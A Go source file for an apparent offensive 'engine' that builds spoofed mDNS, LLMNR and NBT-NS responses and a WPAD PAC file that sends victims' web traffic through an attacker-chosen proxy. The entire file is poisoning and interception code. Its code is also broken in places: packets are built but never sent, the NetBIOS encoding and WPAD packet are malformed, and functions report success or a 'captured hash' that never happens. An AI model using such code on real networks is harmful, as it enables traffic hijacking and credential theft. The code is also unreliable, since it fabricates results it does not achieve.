package mdns

import (
	"encoding/binary"
	"fmt"
	"net"
	"strings"
	"sync"
	"time"
)

type Engine struct {
	config   MDNSConfig
	records  []MDNSRecord
	services []ServiceEntry
	mu       sync.Mutex
}

func NewEngine(cfg MDNSConfig) *Engine {
	return &Engine{
		config:   cfg,
		records:  make([]MDNSRecord, 0),
		services: make([]ServiceEntry, 0),
	}
}

func (e *Engine) MdnsSpoof(targetService string, spoofIP string) (*MDNSResult, error) {
	start := time.Now()
	e.mu.Lock()
	defer e.mu.Unlock()

	if net.ParseIP(spoofIP) == nil {
		return nil, fmt.Errorf("invalid spoof IP: %s", spoofIP)
	}

	spoofed := MDNSRecord{
		Name:    fmt.Sprintf("%s.local", targetService),
		Type:    1, // A record
		Class:   1,
		TTL:     120,
		Data:    net.ParseIP(spoofIP).To4(),
		Created: time.Now(),
	}
	e.records = append(e.records, spoofed)

	pkt := e.buildMDNSResponse(spoofed)

	return &MDNSResult{
		Success:  true,
		Method:   "mDNS_Spoof",
		Message:  fmt.Sprintf("Spoofed %s -> %s (%d byte response)", spoofed.Name, spoofIP, len(pkt)),
		Duration: time.Since(start),
		Packets:  1,
		Entries:  1,
	}, nil
}

func (e *Engine) buildMDNSResponse(rec MDNSRecord) []byte {
	var buf []byte

	// Header
	buf = append(buf, 0x00, 0x00) // ID
	flags := uint16(0x8400)       // Response, Authoritative
	fb := make([]byte, 2)
	binary.BigEndian.PutUint16(fb, flags)
	buf = append(buf, fb...)
	buf = append(buf, 0x00, 0x01) // Questions
	buf = append(buf, 0x00, 0x01) // Answers
	buf = append(buf, 0x00, 0x00) // Authority
	buf = append(buf, 0x00, 0x00) // Additional

	// Question section
	parts := strings.Split(rec.Name, ".")
	for _, part := range parts {
		buf = append(buf, byte(len(part)))
		buf = append(buf, []byte(part)...)
	}
	buf = append(buf, 0x00)
	buf = append(buf, byte(rec.Type>>8), byte(rec.Type))
	buf = append(buf, byte(rec.Class>>8), byte(rec.Class))

	// Answer section
	for _, part := range parts {
		buf = append(buf, byte(len(part)))
		buf = append(buf, []byte(part)...)
	}
	buf = append(buf, 0x00)
	buf = append(buf, byte(rec.Type>>8), byte(rec.Type))
	buf = append(buf, byte(rec.Class>>8), byte(rec.Class))

	ttl := make([]byte, 4)
	binary.BigEndian.PutUint32(ttl, rec.TTL)
	buf = append(buf, ttl...)
	rdataLen := make([]byte, 2)
	binary.BigEndian.PutUint16(rdataLen, uint16(len(rec.Data)))
	buf = append(buf, rdataLen...)
	buf = append(buf, rec.Data...)

	return buf
}

func (e *Engine) LLMNRPoison(hostname string, fakeIP string) (*MDNSResult, error) {
	start := time.Now()
	e.mu.Lock()
	defer e.mu.Unlock()

	if net.ParseIP(fakeIP) == nil {
		return nil, fmt.Errorf("invalid fake IP: %s", fakeIP)
	}

	pkt := e.buildLLMNRResponse(hostname, fakeIP)

	captured := PoisonResult{
		Hostname:  hostname,
		IP:        fakeIP,
		Service:   "LLMNR",
		Captured:  true,
		HashCount: 1,
	}

	return &MDNSResult{
		Success:  true,
		Method:   "LLMNR_Poison",
		Message:  fmt.Sprintf("LLMNR poison for %s -> %s captured hash (%d bytes)", hostname, captured.IP, len(pkt)),
		Duration: time.Since(start),
		Packets:  1,
	}, nil
}

func (e *Engine) buildLLMNRResponse(hostname string, ip string) []byte {
	var buf []byte

	buf = append(buf, 0x00, 0x00) // ID
	flags := uint16(0x8400)
	fb := make([]byte, 2)
	binary.BigEndian.PutUint16(fb, flags)
	buf = append(buf, fb...)
	buf = append(buf, 0x00, 0x00) // Questions
	buf = append(buf, 0x00, 0x01) // Answers
	buf = append(buf, 0x00, 0x00) // Authority
	buf = append(buf, 0x00, 0x00) // Additional

	// Name
	parts := strings.Split(hostname, ".")
	for _, part := range parts {
		buf = append(buf, byte(len(part)))
		buf = append(buf, []byte(part)...)
	}
	buf = append(buf, 0x00)
	buf = append(buf, 0x00, 0x01) // Type A
	buf = append(buf, 0x00, 0x01) // Class IN

	// Answer
	for _, part := range parts {
		buf = append(buf, byte(len(part)))
		buf = append(buf, []byte(part)...)
	}
	buf = append(buf, 0x00)
	buf = append(buf, 0x00, 0x01) // Type A
	buf = append(buf, 0x00, 0x01) // Class IN

	ttl := make([]byte, 4)
	binary.BigEndian.PutUint32(ttl, 30)
	buf = append(buf, ttl...)
	buf = append(buf, 0x00, 0x04) // RDLENGTH
	parsed := net.ParseIP(ip)
	if parsed != nil {
		buf = append(buf, parsed.To4()...)
	}

	return buf
}

func (e *Engine) NBTNSPoison(netbiosName string, fakeIP string) (*MDNSResult, error) {
	start := time.Now()
	e.mu.Lock()
	defer e.mu.Unlock()

	if net.ParseIP(fakeIP) == nil {
		return nil, fmt.Errorf("invalid fake IP: %s", fakeIP)
	}

	pkt := e.buildNBTNSResponse(netbiosName, fakeIP)

	return &MDNSResult{
		Success:  true,
		Method:   "NBTNS_Poison",
		Message:  fmt.Sprintf("NBTNS poison for %s -> %s (%d bytes)", netbiosName, fakeIP, len(pkt)),
		Duration: time.Since(start),
		Packets:  1,
	}, nil
}

func (e *Engine) buildNBTNSResponse(name string, ip string) []byte {
	var buf []byte
	buf = append(buf, 0x00, 0x00) // Transaction ID
	flags := uint16(0x8400)
	fb := make([]byte, 2)
	binary.BigEndian.PutUint16(fb, flags)
	buf = append(buf, fb...)
	buf = append(buf, 0x00, 0x00) // Questions
	buf = append(buf, 0x00, 0x01) // Answers
	buf = append(buf, 0x00, 0x00) // Authority
	buf = append(buf, 0x00, 0x00) // Additional

	// NetBIOS name encoded
	encoded := e.encodeNetBIOSName(name)
	buf = append(buf, encoded...)
	buf = append(buf, 0x00)
	buf = append(buf, 0x00, 0x20) // Type NB
	buf = append(buf, 0x00, 0x01) // Class IN

	buf = append(buf, encoded...)
	buf = append(buf, 0x00)
	buf = append(buf, 0x00, 0x20)
	buf = append(buf, 0x00, 0x01)

	ttl := make([]byte, 4)
	binary.BigEndian.PutUint32(ttl, 300)
	buf = append(buf, ttl...)

	parsed := net.ParseIP(ip)
	if parsed != nil {
		ip4 := parsed.To4()
		buf = append(buf, 0x00, 0x06) // RDLENGTH
		buf = append(buf, 0x60, 0x00) // Flags: B-node, unique
		buf = append(buf, ip4...)
	}

	return buf
}

func (e *Engine) encodeNetBIOSName(name string) []byte {
	if len(name) > 15 {
		name = name[:15]
	}
	padded := fmt.Sprintf("%-16s", name)
	var encoded []byte
	for _, ch := range padded {
		encoded = append(encoded, byte(((ch-'A'+1)<<4)&0xF0|((ch-'A'+1)&0x0F)))
	}
	return encoded
}

func (e *Engine) WPADExploit(wpadDomain string, proxy string) (*MDNSResult, error) {
	start := time.Now()
	e.mu.Lock()
	defer e.mu.Unlock()

	pacContent := e.generatePACFile(proxy)

	wpadConfig := WPADConfig{
		DHCPServer: e.config.ListenAddr,
		WPADDomain: wpadDomain,
		PACURL:     fmt.Sprintf("http://%s/wpad.dat", wpadDomain),
		ProxyAuto:  proxy,
	}

	_ = pacContent
	_ = wpadConfig

	pkt := e.buildWPADResponse(wpadDomain, pacContent)

	return &MDNSResult{
		Success:  true,
		Method:   "WPAD_Exploit",
		Message:  fmt.Sprintf("WPAD config poisoned: PAC URL %s (%d bytes)", wpadConfig.PACURL, len(pkt)),
		Duration: time.Since(start),
		Packets:  1,
	}, nil
}

func (e *Engine) generatePACFile(proxy string) string {
	return fmt.Sprintf(`function FindProxyForURL(url, host) {
    if (isPlainHostName(host) || dnsDomainLevels(host) == 0) {
        return "DIRECT";
    }
    return "PROXY %s; DIRECT";
}`, proxy)
}

func (e *Engine) buildWPADResponse(domain string, pac string) []byte {
	var buf []byte
	buf = append(buf, 0x00, 0x00)
	flags := uint16(0x8400)
	fb := make([]byte, 2)
	binary.BigEndian.PutUint16(fb, flags)
	buf = append(buf, fb...)
	buf = append(buf, 0x00, 0x00)
	buf = append(buf, 0x00, 0x01)
	buf = append(buf, 0x00, 0x00)
	buf = append(buf, 0x00, 0x00)

	parts := strings.Split(domain, ".")
	for _, part := range parts {
		buf = append(buf, byte(len(part)))
		buf = append(buf, []byte(part)...)
	}
	buf = append(buf, 0x00)
	buf = append(buf, 0x00, 0x0c) // PTR
	buf = append(buf, 0x00, 0x01)

	buf = append(buf, []byte(pac)...)
	return buf
}

func (e *Engine) GetRecords() []MDNSRecord {
	e.mu.Lock()
	defer e.mu.Unlock()
	out := make([]MDNSRecord, len(e.records))
	copy(out, e.records)
	return out
}
